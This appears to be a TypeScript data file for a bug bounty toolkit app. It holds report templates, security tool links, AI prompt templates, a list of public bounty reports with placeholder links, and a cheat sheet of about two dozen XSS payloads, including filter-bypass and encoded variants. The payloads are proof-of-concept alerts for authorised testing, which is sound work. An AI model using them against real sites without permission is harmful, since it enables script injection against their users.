
import { ToolLink, ReportTemplate, XSSPayload, PromptTemplate, VulnerabilityReport } from './types';

// --- Report Templates ---
export const REPORT_TEMPLATES: ReportTemplate[] = [
  {
    id: 'h1-generic',
    name: 'HackerOne Generic',
    platform: 'HackerOne',
    content: `## Summary
[Add a brief summary of the vulnerability]

## Steps to Reproduce
1. Go to \`[URL]\`
2. Inject \`[Payload]\` into the parameter \`[Param]\`
3. Observe the execution of...

## Impact
[Describe the impact: attacker can steal cookies, redirect users, etc.]

## Supporting Material/References
* [Screenshot 1]
* [Link to documentation]
`
  },
  {
    id: 'bc-standard',
    name: 'Bugcrowd Standard',
    platform: 'Bugcrowd',
    content: `**Vulnerability Name**: [Name]
**Vulnerability Type**: [Type]

**Description**:
[Detailed description]

**POC**:
\`\`\`http
GET /endpoint?param=payload HTTP/1.1
Host: target.com
...
\`\`\`

**Impact**:
[Business impact]
`
  }
];

// --- XSS Payloads (Based on 2020 Cheat Sheet) ---
export const XSS_PAYLOADS: XSSPayload[] = [
  // Basics
  { id: 'b1', title: 'Basic SVG', vector: '<svg onload=alert(1)>', context: 'HTML', description: 'Standard HTML injection' },
  { id: 'b2', title: 'Script Tag', vector: '<script>alert(1)</script>', context: 'HTML', description: 'Basic script injection' },
  { id: 'b3', title: 'Body Onload', vector: '<body onload=alert(1)>', context: 'HTML', description: 'Requires body tag injection' },
  { id: 'b4', title: 'Image OnError', vector: '<img src=x onerror=alert(1)>', context: 'Attribute', description: 'Common attribute breakout' },
  { id: 'b5', title: 'Iframe JS', vector: '<iframe src=javascript:alert(1)>', context: 'HTML', description: 'DOM insert injection' },
  { id: 'b6', title: 'Details Toggle', vector: '<details open ontoggle=alert(1)>', context: 'HTML', description: 'User interaction trigger' },
  
  // JS Injection
  { id: 'j1', title: 'JS String Escape', vector: '\'-alert(1)-\'', context: 'JS', description: 'Break out of JS single quote string' },
  { id: 'j2', title: 'JS Template Literal', vector: '${alert(1)}', context: 'JS', description: 'Inside backticks' },
  { id: 'j3', title: 'JS Script Breakout', vector: '</script><svg onload=alert(1)>', context: 'JS', description: 'Break out of script block' },
  { id: 'j4', title: 'JS Logical Block', vector: '}alert(1);{', context: 'JS', description: 'Break out of function/conditional' },

  // Advanced / Polyglots
  { id: 'a1', title: 'Double Reflection', vector: '\'onload=alert(1)><svg/1=\'', context: 'Attribute', description: 'Takes advantage of multiple reflections' },
  { id: 'a2', title: 'File Upload Name', vector: '"><svg onload=alert(1)>.gif', context: 'HTML', description: 'Filename reflection' },
  { id: 'a3', title: 'PHP Self URL', vector: 'https://target.com/xss.php/"><svg onload=alert(1)>?a=reader', context: 'URL', description: 'PHP_SELF injection' },
  { id: 'a4', title: 'Markdown Link', vector: '[click](javascript:alert(1))', context: 'URL', description: 'Markdown parser vulnerability' },
  { id: 'a5', title: 'AngularJS (Legacy)', vector: '{{$new.constructor(\'alert(1)\')()}}', context: 'HTML', description: 'Angular template injection' },
  { id: 'a6', title: 'Polyglot 2020', vector: 'javascript://%250Aalert(1)//?1', context: 'Polyglot', description: 'PHP URL Validation Bypass' },
  
  // Bypass Techniques
  { id: 'bp1', title: 'Mixed Case', vector: '<Svg OnLoad=alert(1)>', context: 'HTML', description: 'Bypass case-sensitive filters' },
  { id: 'bp2', title: 'Unclosed Tags', vector: '<svg onload=alert(1)//', context: 'HTML', description: 'Bypass > filtering' },
  { id: 'bp3', title: 'Uppercase XSS', vector: '<SVG ONLOAD=&#97&#108&#101&#114&#116(1)>', context: 'HTML', description: 'When input is uppercased' },
  { id: 'bp4', title: 'Double Encoded', vector: '%253Csvg%2520o%256Eload%253Dalert%25281%2529%253E', context: 'URL', description: 'Double URL encoding bypass' },
  { id: 'bp5', title: 'No Parentheses', vector: 'alert`1`', context: 'JS', description: 'Using backticks for function call' },
  { id: 'bp6', title: 'HTML Entities', vector: '<svg onload=alert&lpar;1&rpar;>', context: 'HTML', description: 'Bypass parentheses filtering' },
  
  // Obfuscation
  { id: 'o1', title: 'Eval + URL', vector: '<svg onload=eval(" \' "+URL)>', context: 'HTML', description: 'Execute payload from URL' },
  { id: 'o2', title: 'Strip-Tags Bypass', vector: '"o<x>nmouseover=alert<x>(1)//', context: 'Attribute', description: 'Bypass PHP strip_tags' }
];

// --- Tools Navigation ---
export const TOOL_LINKS: ToolLink[] = [
  { name: 'Shodan', url: 'https://www.shodan.io/', category: 'Recon', description: 'Search engine for IoT' },
  { name: 'Censys', url: 'https://censys.io/', category: 'Recon', description: 'Attack surface management' },
  { name: 'SecurityTrails', url: 'https://securitytrails.com/', category: 'DNS', description: 'Historical DNS data' },
  { name: 'DNSDumpster', url: 'https://dnsdumpster.com/', category: 'DNS', description: 'DNS reconnaissance' },
  { name: 'PayloadsAllTheThings', url: 'https://github.com/swisskyrepo/PayloadsAllTheThings', category: 'Reference', description: 'Ultimate payload list' },
  { name: 'GTFOBins', url: 'https://gtfobins.github.io/', category: 'Reference', description: 'Unix binary exploitation' },
  { name: 'CyberChef', url: 'https://gchq.github.io/CyberChef/', category: 'Utility', description: ' The Cyber Swiss Army Knife' },
  { name: 'RequestBin', url: 'https://requestbin.com/', category: 'Utility', description: 'Inspect HTTP requests' },
  { name: 'PortSwigger Academy', url: 'https://portswigger.net/web-security', category: 'Training', description: 'Web Security Academy' },
  { name: 'Hack The Box', url: 'https://www.hackthebox.com/', category: 'Training', description: 'Penetration Testing Labs' }
];

// --- AI Prompts ---
export const AI_PROMPTS: PromptTemplate[] = [
  { id: '1', title: 'Obfuscated JS Deobfuscation', category: 'Code Analysis', prompt: 'I have the following obfuscated JavaScript code. Please analyze it step-by-step, rename variables to meaningful names based on their usage, and explain what the code is doing: \n\n[INSERT CODE]' },
  { id: '2', title: 'Vulnerability Impact Statement', category: 'Report Writing', prompt: 'I have found a Stored XSS vulnerability in a profile name field. Write a professional "Impact" section for a bug bounty report, focusing on how this could affect other users and the integrity of the application.' },
  { id: '3', title: 'Subdomain Enumeration Strategy', category: 'Recon', prompt: 'List 10 diverse techniques for subdomain enumeration that go beyond basic brute forcing, including passive sources and certificate transparency logs.' },
  { id: '4', title: 'GraphQL Introspection', category: 'Exploitation', prompt: 'I have access to a GraphQL endpoint with introspection enabled. Construct a query to dump all types, queries, and mutations available in the schema.' }
];

// --- Public Reports (Expanded) ---
export const PUBLIC_REPORTS: VulnerabilityReport[] = [
  { id: '1', title: 'RCE via File Upload', program: 'Uber', bounty: '$15,000', severity: 'Critical', link: '#' },
  { id: '2', title: 'SQL Injection in Search', program: 'Yahoo', bounty: '$10,000', severity: 'High', link: '#' },
  { id: '3', title: 'IDOR in Invoice View', program: 'Shopify', bounty: '$5,000', severity: 'Medium', link: '#' },
  { id: '4', title: 'Information Disclosure via API', program: 'Twitter', bounty: '$2,800', severity: 'Medium', link: '#' },
  { id: '5', title: 'SSRF in Webhook handler', program: 'GitLab', bounty: '$12,000', severity: 'Critical', link: '#' },
  { id: '6', title: 'Stored XSS in Comments', program: 'TikTok', bounty: '$3,500', severity: 'High', link: '#' },
  { id: '7', title: 'Account Takeover via OAuth', program: 'Facebook', bounty: '$25,000', severity: 'Critical', link: '#' },
  { id: '8', title: 'Subdomain Takeover', program: 'Starbucks', bounty: '$1,000', severity: 'Low', link: '#' }
];
